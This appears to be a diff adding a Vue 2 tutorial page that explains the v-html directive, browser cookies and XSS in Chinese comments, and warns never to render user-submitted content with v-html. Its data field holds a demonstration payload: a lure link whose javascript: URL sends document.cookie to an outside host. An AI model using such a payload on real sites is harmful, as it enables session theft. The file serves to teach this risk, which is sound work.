@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>v-html</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+  </head>
+  <body>
+    <div id="app">
+      <!--  
+      有个安全问题 了解下
+        用户在登录某个网站
+        此时 浏览器携带用户登录数据 ==> 服务器
+            服务器 == (key1:value1&key2:value2) ==> 浏览器
+            浏览器 就把这些 存下来
+            这些值称为cookie 
+        这时用户关闭浏览器 再打开这个网站 神奇的是 不用再次进行登录 
+            浏览器在进入到这个网站 查到有这个cookie
+            浏览器携带cookie ==> 服务器
+            服务器识别cookie匹配成功 ==> 浏览器直接进入页面
+                              失败 ==> 浏览器进入登录页面
+        也就是说这个cookie 是用户进入到这个网站的钥匙 
+        试想一下如果第三方拿到这个cookie 会发生什么 信息泄露 等 
+        当然 浏览器不会跨浏览器读取cookie
+      接下来 咱 就干一回坏人 怎么干呢 
+      我们通过document.cookie可以拿到浏览器存储相应网站的cookie
+      当然 有一个属性叫做httpOnly 这个属性 可以防止恶意网站通过document.cookie获取cookie
+      以上这个获取用户的cookie 叫做XSS攻击 
+        -->
+      <!--  
+          v-html指令:
+          1.作用:向指定节点中渲染包含html结构的内容
+          2.与插值语法的区别:
+           (1).v-html会替换掉节点中所有的内容，{{xx}}则不会
+           (2).v-htm1可以识别html结构。
+          3.严重注意:v-htm1有安全性问题!!!!
+            (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击.
+            (2).一定要在可信的内容上使用v-htm1，永不要用在用户提交的内容上! 
+          -->
+
+      <h2 v-html="bad"></h2>
+    </div>
+
+    <script type="text/javascript">
+      Vue.config.productionTip = false;
+
+      new Vue({
+        el: "#app",
+        data: {
+          bad: "<a href=javascript:location.href='https://www.baidu.com?'+document.cookie>千万好礼等你拿，欢饮咨询</a>",
+        },
+      });
+    </script>
+  </body>
+</html>
